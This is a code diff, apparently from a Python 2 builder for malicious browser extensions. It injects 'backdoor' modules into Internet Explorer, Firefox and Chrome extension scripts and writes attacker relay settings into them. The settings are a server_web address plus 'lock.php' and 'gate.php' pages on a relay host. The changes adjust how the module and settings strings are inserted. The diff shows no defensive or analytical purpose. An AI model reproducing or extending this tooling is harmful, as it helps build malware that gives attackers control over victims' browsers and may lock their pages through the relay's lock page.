@@ -61,26 +61,26 @@ def show_plugins(backdoor = ''):
 			if(os.path.isfile(user_input + 'iexplorer/script.js')):
 			    selected = "iexplorer"
 			    open_file = open(user_input + 'iexplorer/script.js').read()
-			    content = open_file.replace('//module',module_content +'\n//module').split('%content%')[1]
-			    content = content.split('%content%')[0]
+			    content  = open_file.replace("//module",module_content +"\n//module")
+			    content = content.replace("%content%", "")
 			    new_file = open(user_input +'iexplorer/script.js',"w")
-			    new_file.write(content+"\n//module")
+			    new_file.write(content+"\n")
 			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor iexplorer writed !"
 			elif(os.path.isfile(user_input + 'firefox/data/content.js')):
 			    selected = "firefox"
 			    open_file = open(user_input + 'firefox/data/content.js').read()
-			    content = open_file.replace('//module',module_content +'\n//module').split('%content%')[1]
-			    content = content.split('%content%')[0]
+			    content  = open_file.replace("//module",module_content +"\n//module")
+			    content = content.replace("%content%", "")
 			    new_file = open(user_input +'firefox/data/content.js',"w")
-			    new_file.write(content+"\n//module")
+			    new_file.write(content+"\n")
 			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor firefox writed !"
 			elif(os.path.isfile(user_input + 'server/js/check.js')):
 			    selected = "chrome"
 			    open_file = open(user_input + 'server/js/check.js').read()
-			    content = open_file.replace('//module',module_content +'\n//module').split('%content%')[1]
-			    content = content.split('%content%')[0]
+			    content  = open_file.replace("//module",module_content +"\n//module")
+			    content = content.replace("%content%", "")
 			    new_file = open(user_input +'server/js/check.js',"w")
-			    new_file.write(content+"\n//module")
+			    new_file.write(content+"\n")
 			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor chrome writed !"
 
 def logo():
@@ -144,7 +144,7 @@ def iexplorer():
         file_read = open('backdoor/iexplorer/script.js').read()
         if "//settings" in file_read:
 	    relais = backdoor_information['relais']
-            code = file_read.replace("//settings", "\n\n    var server_web = '"+relais+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
+            code = file_read.replace("//settings", "\n\n    var server_web = '"+site+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
             file_write = open('backdoor/iexplorer_bk/script.js', 'w')
             file_write.write(code)
             file_write.close()
@@ -495,7 +495,7 @@ def install_server_chrome():
             copy('backdoor/server/','backdoor/server_bk/')
             file_read = open('backdoor/server/js/check.js').read()
             if "//settings" in file_read:
-                code = file_read.replace("//settings", "\n\n    var server_web = '"+relais+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
+                code = file_read.replace("//settings", "\n\n    var server_web = '"+panel+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
                 file_write = open('backdoor/server/js/check.js', 'w')
                 file_write.write(code)
                 file_write.close()
